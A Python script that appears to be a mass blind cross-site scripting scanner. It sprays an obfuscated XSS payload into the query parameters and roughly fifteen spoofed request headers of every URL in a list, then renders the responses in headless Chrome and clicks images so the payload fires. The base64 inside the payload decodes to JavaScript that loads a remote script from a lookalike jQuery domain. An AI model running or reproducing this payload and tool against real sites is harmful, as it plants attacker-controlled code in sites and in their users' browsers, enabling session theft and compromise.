import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from tqdm import tqdm
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# Color codes for console text color
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Read URLs from a file
file_path = "urls.txt"  # Path to the file containing URLs
with open(file_path, "r", encoding="utf-8") as file:
    urls = file.readlines()
urls = [url.strip() for url in urls]


# XSS Payload
payload = '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>'

# Headers with placeholders for XSS payload
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'root': 'dbsewcx["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'Referer': 'http://ei0f3d4k0kfrg["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'X-Originating-IP': 'spoofed["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'Forwarded': 'for=test["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>];by=tupi["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>];host=tupi["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'X-Client-IP': 'tupi["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'X-Wap-Profile': 'http://g["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'CF-Connecting-IP': 'spoofed["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'Contact': 'root@9ku["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'Client-IP': 'spoofed.["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'From': 'root@p5v["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'True-Client-IP': 'spoofe["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'X-Real-IP': 'spoof["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
    'X-Forwarded-For': 'spoofe["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
}


# Iterate over each URL with progress bar
for url in tqdm(urls, desc="Testing URLs"):
    try:
        # parsed_url = urlparse(url)
        # query_params = parse_qs(parsed_url.query)
        parsed_url = urlparse(url)
        try:
            # Attempt to encode the domain using 'idna' codec
            encoded_netloc = parsed_url.netloc.encode("idna").decode("utf-8")
        except UnicodeError:
            print(f"{RED}Unable to encode URL: {url}{RESET}")
            continue
        
        parsed_url = parsed_url._replace(netloc=encoded_netloc)
        query_params = parse_qs(parsed_url.query)
        # Rest of the code to handle the URL parameters
        # Append payload to URL if there are no parameters
        if not query_params:
            modified_url = url + payload
        else:
            # Insert payload in front of each URL parameter
            for param in query_params:
                query_params[param] = payload + query_params[param][0]

            # Reconstruct the modified URL
            modified_query = urlencode(query_params, doseq=True)
            modified_url = urlunparse(parsed_url._replace(query=modified_query))

        # Follow redirects manually up to 3 levels
        # Configure the Selenium web driver in headless mode
        options = Options()
        options.headless = True
        service = Service('/usr/bin/chromedriver')  # Replace with the actual path to chromedriver executable
        driver = webdriver.Chrome(service=service, options=options)

        redirect_count = 0
        while redirect_count < 3:
            response = requests.get(modified_url, headers=headers, timeout=5, allow_redirects=True)
            # Load the response into the headless browser
            driver.get("data:text/html;charset=utf-8," + response.text)

            # Wait for the page to fully render (you can adjust the wait time as needed)
            driver.implicitly_wait(5)

            # Find all img tags and interact with them to trigger their execution/loading
            img_tags = driver.find_elements(By.TAG_NAME, 'img')
            for img in img_tags:
                img.click()  # Click on the image to trigger any associated JavaScript or load the image

            # Wait for any additional JavaScript to execute or resources to load
            driver.implicitly_wait(5)

            # Perform any further processing or analysis on the rendered page

            # Quit the Selenium web driver
            driver.quit()

            if response.status_code == 200:
                print(f"{GREEN}Request to URL {url} was successful{RESET}")
                break
            elif response.status_code >= 300 and response.status_code < 400:
                modified_url = response.headers.get('Location')
                redirect_count += 1
            else:
                print(f"{RED}Request to URL {url} failed with status code {response.status_code}{RESET}")
                break
            
        
        redirect_count = 0
        while redirect_count < 3:    
            response = requests.get(modified_url, timeout=5, allow_redirects=True)
            
            # Load the response into the headless browser
            driver.get("data:text/html;charset=utf-8," + response.text)

            # Wait for the page to fully render (you can adjust the wait time as needed)
            driver.implicitly_wait(5)

            # Find all img tags and interact with them to trigger their execution/loading
            img_tags = driver.find_elements(By.TAG_NAME, 'img')
            for img in img_tags:
                img.click()  # Click on the image to trigger any associated JavaScript or load the image

            # Wait for any additional JavaScript to execute or resources to load
            driver.implicitly_wait(5)

            # Perform any further processing or analysis on the rendered page

            # Quit the Selenium web driver
            driver.quit()

            if response.status_code == 200:
                print(f"{GREEN}Request to URL {url} was successful{RESET}")
                break
            elif response.status_code >= 300 and response.status_code < 400:
                modified_url = response.headers.get('Location')
                redirect_count += 1
            else:
                print(f"{RED}Request to URL {url} failed with status code {response.status_code}{RESET}")
                break

    except Exception as e:
        print(f"{RED}Error occurred for URL {url}: {str(e)}{RESET}")

    # except requests.exceptions.RequestException as e:
    #     print(f"{RED}An error occurred: {e}{RESET}")







































# # XSS Payload
# payload = '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>'

# # Headers with placeholders for XSS payload
# headers = {
#     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'root': 'dbsewcx["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'Referer': 'http://ei0f3d4k0kfrg["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'X-Originating-IP': 'spoofed["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'Forwarded': 'for=test["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>];by=tupi["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>];host=tupi["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'X-Client-IP': 'tupi["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'X-Wap-Profile': 'http://g["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'CF-Connecting-IP': 'spoofed["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'Contact': 'root@9ku["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'Client-IP': 'spoofed.["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'From': 'root@p5v["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'True-Client-IP': 'spoofe["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'X-Real-IP': 'spoof["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'X-Forwarded-For': 'spoofe["><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanF1ZXJ5Lmdsb2JhbC1vbmxpbmVmb29kLnN0b3JlIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>]',
#     'Cookie': 'PHPSESSID=qeebmpot48lrjjqbcovdg50gr4; security=low',
# }